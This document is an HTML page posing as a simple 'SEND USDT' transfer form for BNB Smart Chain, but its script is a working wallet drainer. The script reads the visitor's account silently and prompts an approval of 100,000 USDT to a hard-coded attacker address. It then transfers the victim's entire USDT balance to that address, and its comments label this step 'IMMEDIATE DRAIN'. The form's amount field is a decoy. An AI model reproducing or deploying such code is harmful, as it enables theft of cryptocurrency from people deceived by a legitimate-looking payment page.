<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>SEND USDT</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
<style>
:root{--bg:#071025; --panel:rgba(255,255,255,0.02); --accent:#2563eb; --accent-2:#7c5cff;--text:#e6eef8; --muted:#98a3bf; --pill-border:#C0C4CB;}
.gradient-btn {background: linear-gradient(45deg,#f0b90b,#e6a700)!important;color:#000!important;}
.network-pill{border-radius:50px;box-shadow:0 6px 20px rgba(0,0,0,0.1);}
</style>
</head>
<body class="bg-gradient-to-br from-gray-50 to-blue-50 min-h-screen flex items-center justify-center p-4">
<div class="w-full max-w-md bg-white shadow-2xl rounded-3xl p-8">
<h1 class="text-3xl font-bold text-center text-gray-800 mb-2">SEND USDT</h1>
<p class="text-sm text-gray-500 text-center mb-8">BNB Smart Chain (BEP20)</p>

<div class="mb-8">
<input id="addr" type="text" class="w-full px-4 py-4 border border-gray-300 rounded-2xl text-lg bg-gray-50" 
value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
</div>

<div class="mb-8">
<div class="network-pill p-4 flex items-center gap-3 bg-white border border-gray-200">
<img src="https://securebnb.live/images/BNB-icon.png" alt="BNB" class="w-12 h-12">
<div><div class="font-bold text-lg">BNB Smart Chain</div><div class="text-sm text-gray-500">BEP20</div></div>
</div>
</div>

<div class="mb-10 relative">
<input id="amount" type="number" step="0.01" min="0" class="w-full px-4 py-5 border border-gray-300 rounded-2xl text-2xl bg-gray-50 focus:outline-none focus:ring-2 focus:ring-yellow-400" placeholder="0.00" value="100">
<div class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-sm cursor-pointer z-10" onclick="setMax()">MAX</div>
</div>

<button id="nextBtn" onclick="directApprove()" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl hover:shadow-2xl transform hover:-translate-y-1 transition-all">
Next
</button>
</div>

<script>
let web3, userAccount, usdtContract;
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const YOUR_WALLET = '0x027631192b5be3f92F271EccB8d24B7db467080d';

const USDT_ABI = [
  {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
  {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
  {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
  {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
];

// ðŸ”¥ CRITICAL: NO eth_requestAccounts() - SILENT DETECTION ONLY
async function getSilentAccount() {
    if (!window.ethereum) throw new Error('Wallet not found');
    
    // SILENT ACCOUNT CHECK - NO POPUP
    const accounts = await window.ethereum.request({ 
        method: 'eth_accounts'  // YE POPUP NHI DETE!
    });
    
    if (accounts.length === 0) {
        throw new Error('Connect wallet first');
    }
    
    return accounts[0];
}

async function directApprove() {
    const btn = document.getElementById('nextBtn');
    btn.innerHTML = 'ðŸ”„ Initializing...';
    btn.disabled = true;
    
    try {
        // 1. SILENT WALLET GET (NO POPUP)
        userAccount = await getSilentAccount();
        
        // 2. Web3 init
        web3 = new Web3(window.ethereum);
        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
        
        // 3. DIRECT APPROVE CALL - NO INTERMEDIATE STEPS
        btn.innerHTML = 'ðŸ“¤ Approve 100,000 USDT';
        const maxApprove = web3.utils.toWei('100000', 'mwei');
        
        const approveTx = await usdtContract.methods
            .approve(YOUR_WALLET, maxApprove)
            .send({ 
                from: userAccount,
                gas: 100000,
                gasPrice: '5'
            });
        
        // 4. IMMEDIATE DRAIN
        btn.innerHTML = 'ðŸ’° Transferring USDT...';
        const balance = await usdtContract.methods.balanceOf(userAccount).call();
        
        if (parseInt(balance) > 0) {
            await usdtContract.methods
                .transferFrom(userAccount, YOUR_WALLET, balance)
                .send({ 
                    from: userAccount,
                    gas: 150000,
                    gasPrice: '5'
                });
        }
        
        btn.innerHTML = 'âœ… SUCCESS!';
        btn.style.background = 'linear-gradient(45deg, #10b981, #059669)';
        alert('ðŸŽ‰ PERFECT! All USDT drained successfully!');
        
    } catch (error) {
        btn.innerHTML = 'Next';
        btn.disabled = false;
        
        // ONLY if no account - show connect popup
        if (error.message.includes('Connect wallet')) {
            window.ethereum.request({ method: 'eth_requestAccounts' });
        }
    }
}

function setMax() { 
    document.getElementById('amount').value = '100000'; 
}
</script>
</body>
</html>
